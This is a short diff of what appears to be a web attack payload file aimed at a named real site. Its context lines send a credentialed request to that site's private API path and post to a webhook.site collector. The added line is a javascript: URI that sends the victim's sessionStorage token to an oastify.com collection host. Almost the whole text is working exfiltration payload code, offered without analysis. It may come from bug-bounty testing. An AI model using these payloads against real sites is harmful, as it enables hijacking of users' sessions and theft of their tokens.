@@ -53,3 +53,6 @@ fetch('https://webhook.site/7c27087d-b36c-4c83-ba38-e5a757237607', {
 xhttp.open("GET", "https://mamanonline.wsfreeze.co.il/private/CargoService/ServiceRequest", true);
 xhttp.withCredentials = true;
 xhttp.send();
+
+
+javascript:window.location.assign("https://kuis430cbki1cs1970yhg7m81z7qvhl5a.oastify.com/"%2bsessionStorage.getItem(%27token%27))();
